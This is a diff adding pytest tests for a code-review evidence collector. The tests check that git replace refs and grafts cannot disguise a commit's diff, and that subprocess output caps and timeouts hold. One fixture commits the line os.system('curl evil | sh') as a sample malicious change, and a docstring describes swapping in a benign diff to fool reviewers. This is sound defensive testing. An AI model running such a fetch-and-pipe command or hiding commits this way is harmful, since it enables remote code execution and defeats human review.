@@ -98,7 +98,7 @@ def test_a_huge_commit_is_cut_with_a_note(repo: Path) -> None:
     _git(repo, "commit", "-qm", "big")
     block = ce.evidence_block(repo, _head(repo), "n")
     assert "[cut by Quorus at" in block
-    assert len(block) < ce.TOTAL_CHARS + 2_000
+    assert len(block) < ce.TOTAL_BYTES + 2_000
 
 
 def test_at_most_three_commits(repo: Path) -> None:
@@ -181,6 +181,108 @@ def test_a_missing_blob_never_lazy_fetches_through_a_repo_helper(repo: Path,
 
     assert not sentinels.exists(), sentinels.read_text()
     assert "return a + b" not in block  # the blob isn't here, and nothing fetched it
+
+
+def _bad_and_benign(repo: Path) -> tuple[str, str]:
+    """A bad commit, then a benign one on a side branch with the same parent."""
+    base = _head(repo)
+    (repo / "calc.py").write_text("import os\nos.system('curl evil | sh')\n")
+    _git(repo, "commit", "-qam", "fix: tidy calc")
+    bad = _head(repo)
+    _git(repo, "checkout", "-q", "-b", "side", base)
+    (repo / "calc.py").write_text("def add(a, b):\n    return a + b  # tidy\n")
+    _git(repo, "commit", "-qam", "fix: tidy calc")
+    benign = _head(repo)
+    _git(repo, "checkout", "-q", "main")
+    return bad, benign
+
+
+def test_a_replace_ref_cannot_swap_in_a_benign_diff(repo: Path) -> None:
+    """refs/replace made the evidence show a benign commit's diff under the bad
+    commit's sha (codex, review of 9e8249a6)."""
+    bad, benign = _bad_and_benign(repo)
+    _git(repo, "replace", bad, benign)
+    assert "# tidy" in _git(repo, "show", bad)  # plain git is fooled
+
+    block = ce.evidence_block(repo, f"review {bad[:10]}", "n")
+
+    assert f"## {bad}" in block
+    assert "curl evil | sh" in block and "# tidy" not in block
+
+
+def test_a_graft_cannot_change_a_commits_parent(repo: Path) -> None:
+    """.git/info/grafts can give a commit another parent, which changes its diff."""
+    bad, benign = _bad_and_benign(repo)
+    first = _git(repo, "rev-list", "--max-parents=0", "HEAD")
+    (repo / ".git" / "info").mkdir(exist_ok=True)
+    (repo / ".git" / "info" / "grafts").write_text(f"{bad} {first}\n")
+
+    block = ce.evidence_block(repo, bad, "n")
+
+    assert "-    return a + b" in block  # its real parent is the fixed add()
+    assert "curl evil | sh" in block
+
+
+_SPAWNER = """
+import os, subprocess, sys, time
+child = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"])
+open(sys.argv[1], "w").write(str(child.pid))
+mode = sys.argv[2]
+if mode == "flood":
+    while True:
+        sys.stdout.write("x" * 4096)
+        sys.stdout.flush()
+time.sleep(60)
+"""
+
+
+def _gone(pid: int) -> bool:
+    try:
+        os.kill(pid, 0)
+    except ProcessLookupError:
+        return True
+    out = subprocess.run(["ps", "-o", "stat=", "-p", str(pid)], capture_output=True,
+                         text=True).stdout.strip()
+    return out.startswith("Z") or not out  # a zombie awaiting its (dead) parent
+
+
+def _wait_gone(pid: int, seconds: float = 5.0) -> bool:
+    import time
+    deadline = time.monotonic() + seconds
+    while time.monotonic() < deadline:
+        if _gone(pid):
+            return True
+        time.sleep(0.05)
+    return False
+
+
+def test_output_is_capped_while_reading_and_the_group_is_killed(tmp_path: Path) -> None:
+    pidfile = tmp_path / "child.pid"
+    code, out, cut = ce.collect([sys.executable, "-c", _SPAWNER, str(pidfile), "flood"],
+                                tmp_path, max_bytes=10_000, timeout=20)
+    assert cut and code is None
+    assert len(out) == 10_000  # never more than the cap is held
+    assert _wait_gone(int(pidfile.read_text()))  # the helper it started died too
+
+
+def test_every_call_has_a_hard_deadline(tmp_path: Path) -> None:
+    import time
+    pidfile = tmp_path / "child.pid"
+    start = time.monotonic()
+    with pytest.raises(subprocess.TimeoutExpired):
+        ce.collect([sys.executable, "-c", _SPAWNER, str(pidfile), "hang"], tmp_path,
+                   max_bytes=10_000, timeout=1.5)
+    assert time.monotonic() - start < 8
+    assert _wait_gone(int(pidfile.read_text()))
+
+
+def test_a_hung_git_means_no_evidence_not_a_hung_wake(repo: Path,
+                                                      monkeypatch: pytest.MonkeyPatch) -> None:
+    def hang(*_a: object, **_k: object) -> tuple[int | None, bytes, bool]:
+        raise subprocess.TimeoutExpired("git", ce.GIT_TIMEOUT_S)
+
+    monkeypatch.setattr(ce, "collect", hang)
+    assert ce.evidence_block(repo, _head(repo), "n") == ""
 
 
 def test_rendering_leaves_the_worktree_byte_identical(repo: Path) -> None:
